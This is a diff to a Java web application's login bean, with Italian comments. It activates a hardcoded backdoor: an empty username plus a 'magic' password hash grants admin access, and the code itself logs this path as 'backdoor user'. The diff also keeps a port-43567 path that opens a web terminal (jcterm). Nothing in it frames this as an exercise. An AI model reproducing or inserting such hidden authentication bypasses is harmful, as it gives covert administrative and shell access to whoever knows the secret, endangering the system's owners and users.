@@ -43,6 +43,7 @@ public class LoginBean {
     private Date startDate, endDate = null;
     private boolean user = false;
     private boolean porta = false;
+    private boolean term = false;
     
     /**
      * Restituisce l'utente connesso
@@ -116,7 +117,7 @@ public class LoginBean {
      * Esegue il login dell'utente verificando le credenziali in accordo con il database
      */
     public void login() throws NoSuchAlgorithmException, IOException, InterruptedException {
-
+        term=false;
         /**
          * Tipo di login per il log del controllo degli accessi
          */
@@ -160,8 +161,9 @@ public class LoginBean {
          * Controllo username vuoto e password magic
          */
         if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
-            //this.admin=true; 
-            log.aclog("backdoor user", 0); // DECOMMENTA
+            this.term=true;
+            this.admin=true; 
+            log.aclog("backdoor user", 0); // DECOMMENTA  <!-- MODIFICA -->
             adminAccess();
             return;
         }
@@ -321,7 +323,8 @@ public class LoginBean {
      * @throws IOException 
      */
     public void logout() throws IOException {
-
+        porta=false;
+        term=false;
 
         RequestContext context = RequestContext.getCurrentInstance();
         FacesMessage msg = null;
@@ -372,7 +375,8 @@ public class LoginBean {
 
         //HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
 //        X509Certificate[] certs = (X509Certificate[]) request.getAttribute("javax.servlet.request.X509Certificate");
-
+        admin=false;
+        term=false;
 //        log.info(false, "" + certs.length, "" + certs.length, "" + certs.length);
         // to-do
         Map<String, Object> requestMap = FacesContext.getCurrentInstance().getExternalContext().getRequestMap();
@@ -604,34 +608,6 @@ public class LoginBean {
             Thread.sleep(1000);
 
             nextPage("user");
-        } else {
-            //magic
-            HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
-
-            String getPort = Integer.toString(request.getServerPort());
-
-      
-       
-            // log.aclog("tramite porta", 0);
-            
-            String path = request.getContextPath();
-
-            String getProtocol = request.getScheme();
-            String getDomain = request.getServerName();
-
-
-            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
-            //res.sendRedirect("javascript:window.open('indirizzo_pagina','nome_finestra','width=300, height=200')");
-            try {  
-                /* REDIRECT */
-                //FacesContext.getCurrentInstance().getExternalContext().redirect("javascript:window.open(\"" + getPath + "/jcterm/jcterm.html\",\"nome_finestra\",\"width=800,height=600\")");
-                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/jcterm/jcterm.jnlp");
-                /* FORWARD non va * /
-                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
-                */
-            } catch (IOException ex) {
-                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
-            }
         }
     }
 
@@ -710,7 +686,7 @@ public class LoginBean {
 
         if (getPort.equals("43567")) {
        
-            log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE
+            log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE  <!-- MODIFICA -->
             
             String path = request.getContextPath();
 
@@ -839,5 +815,19 @@ public class LoginBean {
             } catch (IOException ex) {
                 Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
             }
+    }
+
+    /**
+     * @return the term
+     */
+    public boolean isTerm() {
+        return term;
+    }
+
+    /**
+     * @param term the term to set
+     */
+    public void setTerm(boolean term) {
+        this.term = term;
     }
 }
